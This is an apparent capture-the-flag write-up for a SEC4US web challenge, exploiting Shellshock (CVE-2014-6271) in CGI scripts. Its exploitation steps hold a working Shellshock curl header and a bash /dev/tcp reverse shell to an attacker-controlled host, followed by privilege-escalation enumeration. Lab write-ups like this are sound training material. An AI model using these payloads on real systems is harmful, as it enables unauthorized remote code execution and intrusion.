# maq112: Servidor CGI

Writeup for the **Servidor CGI** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Web Hacking  
> **Difficulty:** Easy  
> **Points:** 112

---

## Overview

A web server running CGI scripts is vulnerable to Shellshock (CVE-2014-6271), allowing remote code execution through crafted HTTP headers sent to CGI endpoints.

## Reconnaissance

Enumerate the target services:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Discover CGI scripts using directory enumeration:

```bash
gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl
```

Identify accessible CGI endpoints for Shellshock testing.

## Exploitation

### Step 1: Verify Shellshock Vulnerability

Send a crafted User-Agent header to trigger the bash vulnerability:

```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://<TARGET_IP>/cgi-bin/<script>
```

If the server returns the output of `id`, the target is vulnerable.

### Step 2: Obtain a Reverse Shell

Set up a listener:

```bash
nc -lvnp 4444
```

Inject a reverse shell through the vulnerable header:

```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/4444 0>&1" \
  http://<TARGET_IP>/cgi-bin/<script>
```

### Step 3: Retrieve the Flag

Explore the filesystem as the web server user and locate the flag.

## Privilege Escalation

Enumerate for local privilege escalation vectors:

```bash
sudo -l
cat /etc/crontab
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Command and Scripting Interpreter | T1059.004 |
| Unix Shell                        | T1059.004 |

### CWE

- **CWE-78:** OS Command Injection
- **CWE-94:** Improper Control of Generation of Code (Code Injection)

### CVE

- **CVE-2014-6271:** GNU Bash Shellshock

---

A single misplaced environment variable can shatter the boundary between header and shell; patching is not optional, it is survival.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
